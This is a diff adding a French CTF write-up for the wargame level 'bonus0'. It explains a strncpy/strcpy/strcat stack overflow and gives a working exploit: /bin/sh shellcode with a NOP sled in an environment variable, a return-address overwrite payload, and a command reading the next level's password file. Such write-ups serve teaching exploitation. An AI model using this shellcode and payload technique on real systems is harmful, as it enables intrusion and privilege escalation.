@@ -1,0 +1,56 @@
+Ce programme crée un buffer de 64 octets dans main, puis passe ce buffer en argument à la fonction pp.
+
+La fonction pp crée deux buffers de 20 octets chacun, puis appelle deux fois la fonction p, avec le buffer 1 puis le buffer 2, ainsi qu’un second paramètre de valeur " - ".
+
+La fonction p affiche ce prompt (" - ") sur stdout, puis lit l’entrée standard avec read et range ce qu’elle a lu dans un buffer local de 4096 octets. Elle appelle ensuite strchr pour remplacer le caractère newline par un \0 (le caractère de fin de chaîne). Enfin, elle appelle strncpy pour copier 20 octets depuis son buffer local vers le buffer reçu en paramètre (un des deux buffers de pp).
+
+Une fois p appelée deux fois, pp fait un strcpy depuis son premier buffer vers le buffer de main, puis un strcat de son second buffer vers ce même buffer de main.
+
+La faille : strncpy ne place pas de \0 de fin quand la source fait 20 octets ou plus. Et les deux buffers de pp sont collés en mémoire (séparés de 20 octets exactement). Résultat : il n’y a aucun \0 entre eux, ils fusionnent en une seule chaîne continue.
+
+Du coup, le strcpy (qui copie jusqu’au premier \0) copie bien plus que 20 octets : il copie les deux buffers fusionnés. Puis le strcat ajoute une seconde fois le contenu de la deuxième entrée. On peut ainsi écrire assez d’octets pour déborder et écraser l’adresse de retour de pp (celle de main est hors de portée). On la remplace par l’adresse d’un shellcode placé dans une variable d’environnement, qui ouvre un shell avec les droits du niveau suivant.
+
+bash
+# 1. Exporter le shellcode dans une variable d'environnement
+export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+
+# 2. Créer et compiler un programme pour trouver l'adresse de la variable d'env
+cat > /tmp/getenv.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+    printf("%s is at %p\n", argv[1], getenv(argv[1]));
+}
+EOF
+gcc /tmp/getenv.c -o /tmp/getenv
+
+# 3. Récupérer l'adresse du shellcode
+/tmp/getenv SHELLCODE
+# → affiche par exemple : SHELLCODE is at 0xbffff8c9
+
+# 4. Construire le payload
+python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xc9\xf8\xff\xbf' + 'C'*50" > /tmp/payload_bonus0
+
+# 5. Lancer l'exploit
+cat /tmp/payload_bonus0 - | ./bonus0
+
+# 6. Dans le shell obtenu
+cat /home/user/bonus1/.pass
+
+Détails du payload :
+
+'A'*4095 + '\n' : la première entrée. Elle sature le premier read (qui lit jusqu’à 4096 octets d’un coup), ce qui force la coupure au \n et laisse la deuxième ligne disponible pour le second read. Le contenu lui-même n’a pas d’importance.
+'B'*9 : le bourrage de la deuxième entrée, pour arriver pile sur l’adresse de retour de pp.
+'\xc9\xf8\xff\xbf' : l’adresse du shellcode (ici 0xbffff8c9).
+
+Le padding 'C'*50 après l’adresse est nécessaire : il complète le débordement pour que l’adresse de retour de pp soit correctement écrasée et que le saut tombe dans le NOP sled.
+
+Pourquoi l’adresse est écrite à l’envers (little-endian) : le processeur x86 est little-endian, c’est-à-dire qu’il range les octets d’un nombre du poids faible au poids fort. Donc l’adresse 0xbffff8c9 se décompose en 4 octets bf ff f8 c9, qu’on écrit dans l’ordre inverse : \xc9\xf8\xff\xbf. Ainsi, une fois rangée en mémoire et relue par le CPU, elle reforme bien 0xbffff8c9.
+
+Note : le shellcode est placé dans une variable d’environnement (et non dans le buffer) car l’espace exploitable dans le buffer est trop petit pour l’y loger. On ne met donc dans le payload que l’adresse (4 octets) pointant vers ce shellcode. Le NOP sled (\x90*64) devant le shellcode donne une marge : l’adresse n’a pas besoin de viser exactement le début du shellcode, il suffit de tomber dans la zone de NOP.
+
+Un NOP (\x90) est une instruction qui ne fait rien : le processeur la lit, ne produit aucun effet, et passe à la suivante. En enchaîner 64 crée une « rampe » : si le saut tombe n’importe où dans cette zone, le CPU glisse de NOP en NOP jusqu’à atteindre le shellcode juste après.
+
+Le NOP sled compense le fait que l’adresse exacte du shellcode peut varier (env différent entre getenv et bonus0)
